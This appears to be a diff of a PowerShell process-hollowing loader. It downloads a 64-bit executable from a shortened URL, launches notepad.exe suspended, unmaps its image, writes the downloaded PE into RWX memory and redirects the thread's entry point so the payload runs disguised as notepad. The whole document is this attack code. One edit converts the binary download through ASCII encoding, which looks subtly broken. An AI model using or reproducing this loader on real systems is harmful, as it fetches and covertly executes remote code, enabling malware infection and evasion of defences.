@@ -148,7 +148,8 @@ $exeUrl = "https://tinyurl.com/mwr259jv"
 
 Write-Host "[*] Downloading 64-bit payload..."
 $payloadBytes = Invoke-WebRequest $exeUrl -UseBasicParsing
-$peBytes = $payloadBytes.Content
+$pe = $payloadBytes.Content
+$peBytes = [System.Text.Encoding]::ASCII.GetBytes($pe)
 
 $si = New-Object Native+STARTUPINFO
 $pi = New-Object Native+PROCESS_INFORMATION
@@ -158,28 +159,26 @@ Write-Host "[*] Launching notepad suspended..."
 $result = [Native]::CreateProcess("C:\Windows\System32\notepad.exe", $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
 if (!$result) { Write-Error "[-] Failed to create process"; exit }
 
-# Prepare context
+# Get base address and context
 $ctx = New-Object Native+CONTEXT64
-$ctx.ContextFlags = 0x100000 -bor 0x1F  # CONTEXT_ALL
-
+$ctx.ContextFlags = 0x100000 | 0x1F  # CONTEXT_ALL
 [Native]::GetThreadContext($pi.hThread, [ref]$ctx) | Out-Null
 
-# Read base image address from PEB
 $buffer = New-Object byte[] 8
 [IntPtr]$bytesRead = [IntPtr]::Zero
 [Native]::ReadProcessMemory($pi.hProcess, [IntPtr]($ctx.Rdx + 0x10), $buffer, 8, [ref]$bytesRead)
 $imageBase = [BitConverter]::ToUInt64($buffer, 0)
 
-# Unmap existing image
+# Unmap original executable from memory
 [Native]::NtUnmapViewOfSection($pi.hProcess, [IntPtr]$imageBase) | Out-Null
 
-# Parse PE headers
+# Parse PE headers to get SizeOfImage and EntryPoint
 $newImageBase = $imageBase
-$entryRVA = [BitConverter]::ToUInt32($peBytes, 0x28)
-$headersSize = [BitConverter]::ToUInt32($peBytes, 0x54)
-$sizeOfImage = [BitConverter]::ToUInt32($peBytes, 0x50)
+$headersSize = [BitConverter]::ToUInt32($peBytes, 0x54) # SizeOfHeaders
+$sizeOfImage = [BitConverter]::ToUInt32($peBytes, 0x50)  # SizeOfImage
+$entryRVA = [BitConverter]::ToUInt32($peBytes, 0x28)    # AddressOfEntryPoint
 
-# Allocate memory for the new image
+# Allocate memory for new image
 $remoteBase = [Native]::VirtualAllocEx($pi.hProcess, [IntPtr]$newImageBase, $sizeOfImage, 0x3000, 0x40)
 
 # Write PE headers
@@ -197,12 +196,12 @@ for ($i = 0; $i -lt $numberOfSections; $i++) {
     $sectionOffset += 0x28
 }
 
-# Set thread context to new entry point
+# Set the thread context to the new entry point
 $ctx.Rcx = [UInt64]($remoteBase.ToInt64() + $entryRVA)
 $ctx.Rip = [UInt64]($remoteBase.ToInt64() + $entryRVA)
 [Native]::SetThreadContext($pi.hThread, [ref]$ctx) | Out-Null
 
-# Resume the suspended thread
+# Resume the main thread of the process
 [Native]::ResumeThread($pi.hThread) | Out-Null
 
 Write-Host "[+] Hollowing complete! notepad.exe is running your payload."
